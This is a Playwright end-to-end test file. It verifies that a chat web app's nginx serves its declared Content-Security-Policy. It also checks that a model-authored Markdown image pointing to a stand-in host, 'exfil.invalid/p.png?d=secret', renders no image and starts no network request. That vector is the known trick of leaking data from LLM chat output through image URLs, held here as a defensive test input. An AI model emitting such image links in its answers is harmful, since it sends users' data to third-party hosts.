/**
 * va8 — browser-level proof, the only place these two facts can be proven.
 *
 * jsdom fetches no subresources, so no unit test can ever observe a network
 * request; and neither the FastAPI middleware test nor the nginx contract test
 * proves that a real browser is *served* the policy. Both of those live here,
 * against the production Nginx image and the deterministic service brought up
 * by docker-compose.e2e.yml.
 *
 * Deliberately a sibling of app.spec.ts rather than an edit to it: app.spec.ts
 * and service/e2e_app.py are both rewritten on integration/1kg-workbench, and a
 * new file merges where an edit would conflict.
 */
import { promises as fs } from 'node:fs'
import path from 'node:path'
import { expect, test } from '@playwright/test'

test('nginx serves the Content-Security-Policy it declares', async ({ page }) => {
  // Playwright's cwd is ui/ — app.spec.ts resolves e2e/performance-budget.json
  // the same way. Reading the declaration rather than hard-coding it is what
  // makes this test a two-host equality check instead of a third copy.
  const conf = await fs.readFile(path.resolve('nginx.conf'), 'utf-8')
  const declared = /add_header\s+Content-Security-Policy\s+"([^"]*)"\s+always;/.exec(conf)
  if (declared === null) {
    throw new Error('ui/nginx.conf declares no `add_header Content-Security-Policy "…" always;` (va8 B4)')
  }

  const response = await page.goto('/')
  expect(response?.status()).toBe(200)
  // Equality is asserted ONLY on the unproxied SPA document. The six proxied
  // locations carry the header twice by design (nginx adds it, and the service
  // sets its own), and Playwright folds duplicate headers of one name into a
  // single comma-joined value — so an equality assertion on a proxied path
  // would fail for a correct configuration.
  expect(response?.headers()['content-security-policy']).toBe(declared[1])
})

test('a model-authored remote image renders no <img> and starts no request to the third-party host', async ({
  page,
}, testInfo) => {
  const requests: string[] = []
  page.on('request', (request) => {
    requests.push(request.url())
  })

  // A route scoped to the hostile host only. It records the attempt
  // deterministically (the browser awaits a route handler; it does not await a
  // `request` event) and aborts it, so a `.invalid` name cannot hang the settle
  // below on DNS. It observes the same fact the collector does, from the other
  // side.
  const intercepted: string[] = []
  await page.route('https://exfil.invalid/**', async (route) => {
    intercepted.push(route.request().url())
    await route.abort()
  })

  // Invites are single-use and one is consumed per attempt. Tokens 0 and 1
  // belong to app.spec.ts's two attempts; 3 and 4 are this spec's. A collision
  // shows up as a 400 at account creation, which reads like a product fault and
  // is not one. Seeded by service/e2e_app.py (E2E_INVITE_TOKENS).
  const invite = `e2e-invite-token-${3 + testInfo.retry}`
  await page.goto(`/#invite=${invite}`)
  await expect(page.getByRole('heading', { name: 'Aetheril' })).toBeVisible()
  await page.getByLabel('Email').fill(`va8-tester-${testInfo.retry}@example.com`)
  await page.getByLabel('Password').fill('e2e-password-123')
  await page.getByRole('button', { name: 'Create account' }).click()

  await expect(page.getByRole('button', { name: 'Enter the Tavern' })).toBeVisible()
  await page.getByRole('button', { name: 'Enter the Tavern' }).click()
  await page
    .getByRole('navigation', { name: 'Channels' })
    .getByRole('button', { name: 'Spell' })
    .click()
  await page.getByRole('button', { name: 'New conversation' }).click()

  // The deterministic service echoes the prompt back as the answer, so the
  // vector reaches the real Markdown component with no fixture surgery.
  const prompt = 'va8-vector ![p](https://exfil.invalid/p.png?d=secret) tail-marker'
  await page.getByPlaceholder('Ask…').fill(prompt)
  await page.getByRole('button', { name: 'Send message' }).click()

  // ChatPane renders the player's raw prompt as well as the answer, so an
  // unscoped getByText('va8-vector') resolves to two nodes and strict mode
  // throws — a failure that reads like a product fault and is not one. And
  // ds/ChatMessage sets no ARIA role and no accessible name, so the class names
  // the two components own are the only unambiguous scope.
  const answer = page.locator('.chat-message--dm .aether-markdown')
  await expect(answer).toHaveCount(1)
  // THE POSITIVE CONTROL. Every assertion below is a negative one, and a
  // negative assertion over a page that never rendered is vacuous. This can
  // only pass if the markdown pipeline ran and consumed the image syntax: had
  // it not, the literal `![p](https://exfil.invalid/p.png?d=secret)` would
  // still be sitting between the two markers.
  //
  // The whitespace tolerance is not slack: Playwright normalizes whitespace for
  // a string expectation but NOT for a RegExp one (ExpectedTextMatcher.matches
  // skips normalize() when a regex is set), and marked emits a trailing newline
  // after </p>, which becomes a text node of this div.
  await expect(answer).toHaveText(/^\s*E2E spell answer: va8-vector\s+tail-marker\s*$/)

  await page.waitForLoadState('networkidle')
  // Soft, so one run reports every fact instead of stopping at the first.
  await expect.soft(answer.locator('img')).toHaveCount(0)
  expect
    .soft(intercepted, 'the browser started a request for the hostile host')
    .toEqual([])
  expect.soft(requests.filter((url) => url.includes('exfil.invalid'))).toEqual([])
  // The collector's OWN positive control: a `request` handler that never ran
  // would make both negative assertions above it true by accident.
  expect(requests.some((url) => url.startsWith('http://127.0.0.1:4173'))).toBe(true)
})
